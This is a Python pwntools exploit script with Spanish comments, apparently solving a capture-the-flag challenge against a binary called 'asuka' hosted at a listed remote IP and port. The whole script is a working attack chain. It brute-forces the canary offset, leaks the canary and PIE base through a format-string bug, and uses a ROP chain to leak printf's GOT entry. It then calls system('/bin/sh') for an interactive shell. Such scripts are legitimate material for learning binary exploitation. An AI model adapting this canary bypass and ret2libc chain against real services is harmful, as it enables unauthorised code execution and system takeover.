from pwn import *
#funcion para descubrie por fuezar bruta el offset al canary
def brute():
    for i in range(1, 600):
        p = process('./asuka2')
        test = "aaa"
        p.sendlineafter("ID?", test)
        pattern = "asuka\x00"
        pattern += "A" * i
        p.sendlineafter("shinji?", pattern)
        resp = p.recvall()
        if "smash" in resp:
            print "offset de canary en ",i
            p.close()
            return i
            break
        else:
            print "wait wait ",i
            p.close()
    offset = i
    return offset

offset = brute()
print "Offset al chequeo de canary en ", offset
#pwntools para los symbols del elf
e = ELF('./asuka')

#usando el argumento GDB para atachar el debuger
if args.GDB:
    l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    r = process('./asuka')
    gdb.attach(r)
#arg para ejecutar remoto
elif args.remote:
    #para buscar la version de libc, luego de lekear varios address se puede usar https://libc.nullbyte.cat/
    l = ELF('libc.so.6')
    r = remote('167.71.175.244', 4488)
else:
    #ejecucion normal
    l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    r = process('./asuka')


#creando el payload para explotar el format string
payload = ''
payload += "%p " * 64
#creando lista para el leak
leak = []
#enviando el payload
r.sendlineafter('ID?', payload)
leak = r.recvuntil('res').split(' ')
#imprimiendo el leak completo
print "##### MEMORY LEAK #####\n"
print leak
print "##### ----------- #####\n"

#leak donde se encuentra el canary
canary =  int(leak[39], 16)
#leak de una direccion dentro del binario
pie_leak = int(leak[41], 16)
#calculo de la direccion base del binario
pie_base = pie_leak - 0x1355 #offset del leak al pie base
#imnprimiendo leaks
print "##### LEAKS IIMPORTANTES #####\n"
print "CANARY       ",hex(canary) 
print "PIE LEAK     ",hex(pie_leak)
print "PIE BASE     ",hex(pie_base)
print "##### ------------------ #####\n"
#enviando exploit para explotar el buffer overflow y lekear la direccion de printf en GOT
exploit = 'asuka\x00'
exploit += "A" * 34
exploit += p64(canary) #bypass de canary
exploit += "A" * 8
exploit += p64(pie_base + 0x00000000000013cb) #pop rdi
exploit += p64(pie_base + e.got['printf'])
exploit += p64(pie_base + e.plt['puts'])
exploit += p64(pie_base + 0x0000000000001274) #ret a nerv para volver a ejecutar
#enviando exploit
r.sendlineafter('shinji?', exploit)
r.recvuntil('mente!')
#recibiendo leak de printf y convirtiendo a int base 16
resp = u64(r.recv(8))
resp = "0x"+hex(resp).replace("0a", "").replace("0xa", "")
printf = int(resp, 16)
#calculando libc base usando el leak de printf
libc = printf - l.symbols['printf']
#calculando system
system = libc + l.symbols['system']
#buscando /bin/sh
binsh = libc + next(l.search('/bin/sh\x00'))
print "##### CALCULO DE DIRECCIONES #####\n"
print "PRINTF       ", hex(printf)
print "LIBC         ", hex(libc)
print "SYSTEM       ", hex(system)
print "/bin/sh      ", hex(binsh)
print "##### ---------------------- #####\n"
#enviando segundo exploit para explotar buffer overflow en nerv() nuevamente usando los calculos de address
exploit2 = 'asuka\x00'
exploit2 += "A" * 34
exploit2 += p64(canary)
exploit2 += "A" * 8
exploit2 += p64(pie_base + 0x00000000000013cb) #pop rdi
exploit2 += p64(binsh)
exploit2 += p64(system)
exploit2 += p64(pie_base + 0x1365)#offset a ret main auqnue da igual, se puede poier un exit para salir clean...

r.sendlineafter('shinji?', exploit2)
r.interactive()